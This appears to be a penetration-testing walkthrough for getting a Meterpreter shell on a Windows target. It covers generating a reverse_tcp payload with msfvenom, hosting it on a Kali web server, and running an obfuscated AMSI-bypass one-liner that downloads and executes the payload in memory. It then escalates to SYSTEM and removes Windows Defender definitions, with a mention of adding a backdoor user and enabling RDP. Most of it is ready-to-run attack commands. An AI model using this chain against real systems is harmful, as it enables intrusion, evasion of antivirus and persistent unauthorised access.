Download the powershell script from here onto your Kali box (This script will execute files in memory and not run from disk.):
```
https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Simple%20Shellcode%20Runner/Simple%20Shellcode%20Runner.ps1
```

Rename the files to run.txt
```
mv Simple%20Shellcode%20Runner.ps1 run.txt
```


The line we want to change is this one:
```
[Byte[]] $buf = 
```

So to change it, we will use metasploit (Details are commented in the file just above the buff= variable):
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.2.10.254 LPORT=443 EXITFUNC=thread -f powershell
```

LHOST => Kali IP
LPORT => Listening Port

Replace the buff= code with the newly generated one

Next, we will download the code onto the target box and execute it in memory:
A couple of things we first need to setup:
#### Start the web server on Kali:
```
python3 -m http.server 8000
```

This is to that we can download the payload run.txt
#### Start metasploit Listener:
This is to execute the payload using metasploit
```
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set EXITFUNC thread;set LPORT 443;set LHOST eth1; set ExitOnSession false; run -j -z"
```

run -j -z => Run in the background

On the target box, run:

```
# Patch the Anti Malware Scanning Interface (AMSI) to disable AV so that we can run our command.
# IEX will download out payload and execute it in memory
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344); IEX (new-object system.net.webclient).downloadstring('http://10.2.10.254:8000/run.txt')

# Or if in command line and you need to run it as powershell:

powershell "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344); IEX (new-object system.net.webclient).downloadstring('http://10.2.10.254:8000/run.txt')"
```

In msfconsole, it should create a session now.
Once you have a session connect to it:
```
sessions
session 1
```

Now run
```
getuid
```

If the user is still "*IIS APPPOOL\DefaultAppPool*", run:
```
getsystem
```

Run again getuid, you should be system now.
Once you are system user, you can disable the AV.
```
shell
```

This should open shell command on the target box with SYSTEM access.
You can now browse the c:\Users directory, etc.

# Disable defender and AMSI
Disable defender and AMSI, add a backdoor user for persistence and enable RDP for
easy access. This should be detected by defenders.
Disable firewall:

```PowerShell
"C:\Program Files\Windows Defender\MpCmdRun. exe" -RemoveDefinitions -All"
```

